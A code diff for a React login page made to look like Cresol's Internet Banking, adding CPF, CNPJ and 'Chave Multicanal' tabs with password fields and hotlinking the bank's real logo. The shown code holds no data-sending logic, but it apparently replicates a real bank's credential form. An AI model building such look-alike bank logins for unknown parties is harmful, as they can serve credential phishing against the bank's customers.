@@ -12,44 +12,19 @@ const TABS = [
 const Index = () => {
   const [tab, setTab] = useState("fisica");
   const [cpf, setCpf] = useState("");
+  const [cnpj, setCnpj] = useState("");
+  const [chaveMulticanal, setChaveMulticanal] = useState("");
   const [senha, setSenha] = useState("");
   const [showSenha, setShowSenha] = useState(false);
   const [saveCpf, setSaveCpf] = useState(false);
+  const [saveCnpj, setSaveCnpj] = useState(false);
+  const [saveChaveMulticanal, setSaveChaveMulticanal] = useState(false);
 
-  return (
-    <div className="min-h-screen flex bg-[#fff]">
-      {/* Left: Formulário */}
-      <div className="w-1/2 flex flex-col justify-center px-[7%] py-12 relative">
-        <div className="max-w-md w-full mx-auto">
-          <img
-            src="https://www.cresol.com.br/img/logo-green.svg"
-            alt="Cresol"
-            className="h-8 mb-8"
-            style={{ filter: "brightness(0) saturate(100%) invert(16%) sepia(88%) saturate(453%) hue-rotate(112deg) brightness(93%) contrast(91%)" }}
-          />
-          <h1 className="text-2xl font-semibold text-[#145C36] mb-3">Bem-vindo</h1>
-          <p className="text-[1rem] text-gray-600 mb-8">
-            Acesse sua conta e realize suas transações de forma rápida e segura a qualquer hora.
-          </p>
-          {/* Tabs */}
-          <div className="flex mb-2 space-x-8 border-b border-gray-200">
-            {TABS.map((t, idx) => (
-              <button
-                key={t.value}
-                className={`pb-2 text-base font-semibold transition-colors 
-                  ${
-                    tab === t.value
-                      ? "text-[#145C36] border-b-4 border-orange-400"
-                      : "text-gray-500 border-b-4 border-transparent hover:text-[#145C36]"
-                  }`}
-                onClick={() => setTab(t.value)}
-              >
-                {t.label}
-              </button>
-            ))}
-          </div>
-          {/* Login Form */}
-          <form className="mt-6">
+  const renderFormContent = () => {
+    switch (tab) {
+      case "fisica":
+        return (
+          <>
             {/* CPF */}
             <div className="mb-4">
               <label className="block text-sm text-gray-700 font-medium mb-1">CPF</label>
@@ -97,6 +72,155 @@ const Index = () => {
                 Salvar CPF
               </label>
             </div>
+          </>
+        );
+
+      case "juridica":
+        return (
+          <>
+            {/* CNPJ */}
+            <div className="mb-4">
+              <label className="block text-sm text-gray-700 font-medium mb-1">CNPJ</label>
+              <input
+                type="text"
+                className="w-full h-11 px-3 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-[#145C36] focus:border-[#145C36] transition text-base bg-white"
+                placeholder="CNPJ"
+                value={cnpj}
+                onChange={(e) => setCnpj(e.target.value)}
+                autoComplete="username"
+              />
+            </div>
+            {/* Senha */}
+            <div className="mb-3 relative">
+              <label className="block text-sm text-gray-700 font-medium mb-1">Senha de acesso</label>
+              <input
+                type={showSenha ? "text" : "password"}
+                className="w-full h-11 px-3 pr-10 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-[#145C36] focus:border-[#145C36] transition text-base bg-gray-100"
+                placeholder="Senha"
+                value={senha}
+                onChange={(e) => setSenha(e.target.value)}
+                autoComplete="current-password"
+              />
+              <button
+                type="button"
+                className="absolute right-3 top-[38px] transform -translate-y-1/2 text-gray-400 hover:text-[#145C36]"
+                tabIndex={-1}
+                onClick={() => setShowSenha((v) => !v)}
+                aria-label={showSenha ? "Ocultar senha" : "Mostrar senha"}
+              >
+                {showSenha ? <EyeOff size={20} /> : <Eye size={20} />}
+              </button>
+            </div>
+
+            {/* Salvar CNPJ */}
+            <div className="flex items-center mb-6">
+              <input
+                id="saveCnpj"
+                type="checkbox"
+                checked={saveCnpj}
+                onChange={() => setSaveCnpj((v) => !v)}
+                className="w-4 h-4 accent-[#145C36] border-gray-300 rounded focus:ring-[#145C36]"
+              />
+              <label htmlFor="saveCnpj" className="ml-2 text-sm text-gray-700">
+                Salvar CNPJ
+              </label>
+            </div>
+          </>
+        );
+
+      case "financeiro":
+        return (
+          <>
+            {/* Chave Multicanal */}
+            <div className="mb-4">
+              <label className="block text-sm text-gray-700 font-medium mb-1">Chave Multicanal</label>
+              <input
+                type="text"
+                className="w-full h-11 px-3 border border-orange-400 rounded focus:outline-none focus:ring-2 focus:ring-orange-400 focus:border-orange-400 transition text-base bg-white"
+                placeholder="Chave Multicanal"
+                value={chaveMulticanal}
+                onChange={(e) => setChaveMulticanal(e.target.value)}
+                autoComplete="username"
+              />
+            </div>
+            {/* Senha */}
+            <div className="mb-3 relative">
+              <label className="block text-sm text-gray-700 font-medium mb-1">Senha de acesso</label>
+              <input
+                type={showSenha ? "text" : "password"}
+                className="w-full h-11 px-3 pr-10 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-[#145C36] focus:border-[#145C36] transition text-base bg-gray-100"
+                placeholder="Senha"
+                value={senha}
+                onChange={(e) => setSenha(e.target.value)}
+                autoComplete="current-password"
+              />
+              <button
+                type="button"
+                className="absolute right-3 top-[38px] transform -translate-y-1/2 text-gray-400 hover:text-[#145C36]"
+                tabIndex={-1}
+                onClick={() => setShowSenha((v) => !v)}
+                aria-label={showSenha ? "Ocultar senha" : "Mostrar senha"}
+              >
+                {showSenha ? <EyeOff size={20} /> : <Eye size={20} />}
+              </button>
+            </div>
+
+            {/* Salvar Chave Multicanal */}
+            <div className="flex items-center mb-6">
+              <input
+                id="saveChaveMulticanal"
+                type="checkbox"
+                checked={saveChaveMulticanal}
+                onChange={() => setSaveChaveMulticanal((v) => !v)}
+                className="w-4 h-4 accent-[#145C36] border-gray-300 rounded focus:ring-[#145C36]"
+              />
+              <label htmlFor="saveChaveMulticanal" className="ml-2 text-sm text-gray-700">
+                Salvar Chave Multicanal
+              </label>
+            </div>
+          </>
+        );
+
+      default:
+        return null;
+    }
+  };
+
+  return (
+    <div className="min-h-screen flex bg-[#fff]">
+      {/* Left: Formulário */}
+      <div className="w-1/2 flex flex-col justify-center px-[7%] py-12 relative">
+        <div className="max-w-md w-full mx-auto">
+          <img
+            src="https://www.cresol.com.br/img/logo-green.svg"
+            alt="Cresol"
+            className="h-8 mb-8"
+            style={{ filter: "brightness(0) saturate(100%) invert(16%) sepia(88%) saturate(453%) hue-rotate(112deg) brightness(93%) contrast(91%)" }}
+          />
+          <h1 className="text-2xl font-semibold text-[#145C36] mb-3">Bem-vindo</h1>
+          <p className="text-[1rem] text-gray-600 mb-8">
+            Acesse sua conta e realize suas transações de forma rápida e segura a qualquer hora.
+          </p>
+          {/* Tabs */}
+          <div className="flex mb-2 space-x-8 border-b border-gray-200">
+            {TABS.map((t, idx) => (
+              <button
+                key={t.value}
+                className={`pb-2 text-base font-semibold transition-colors 
+                  ${
+                    tab === t.value
+                      ? "text-[#145C36] border-b-4 border-orange-400"
+                      : "text-gray-500 border-b-4 border-transparent hover:text-[#145C36]"
+                  }`}
+                onClick={() => setTab(t.value)}
+              >
+                {t.label}
+              </button>
+            ))}
+          </div>
+          {/* Login Form */}
+          <form className="mt-6">
+            {renderFormContent()}
 
             {/* Entrar */}
             <button
@@ -110,14 +234,27 @@ const Index = () => {
             </button>
           </form>
 
-          {/* Primeiro acesso */}
-          <div className="mt-10 border-t border-gray-100 pt-8">
-            <h2 className="text-lg font-semibold mb-2 text-[#145C36]">Primeiro acesso</h2>
-            <p className="text-sm text-gray-600">
-              Primeiro acesso ao Internet Banking Cresol? <br />
-              <a href="#" className="text-orange-500 underline hover:text-orange-600 transition">Clique aqui</a> para criar sua senha.
-            </p>
-          </div>
+          {/* Primeiro acesso - só aparece na aba financeiro */}
+          {tab === "financeiro" && (
+            <div className="mt-10 border-t border-gray-100 pt-8">
+              <h2 className="text-lg font-semibold mb-2 text-[#145C36]">Primeiro acesso</h2>
+              <p className="text-sm text-gray-600">
+                Primeiro acesso ao Internet Banking Cresol? <br />
+                <a href="#" className="text-orange-500 underline hover:text-orange-600 transition">Clique aqui</a> para criar sua senha.
+              </p>
+            </div>
+          )}
+
+          {/* Primeiro acesso - abas física e jurídica */}
+          {(tab === "fisica" || tab === "juridica") && (
+            <div className="mt-10 border-t border-gray-100 pt-8">
+              <h2 className="text-lg font-semibold mb-2 text-[#145C36]">Primeiro acesso</h2>
+              <p className="text-sm text-gray-600">
+                Primeiro acesso ao Internet Banking Cresol? <br />
+                <a href="#" className="text-orange-500 underline hover:text-orange-600 transition">Clique aqui</a> para criar sua senha.
+              </p>
+            </div>
+          )}
         </div>
         
         {/* Help Icon */}
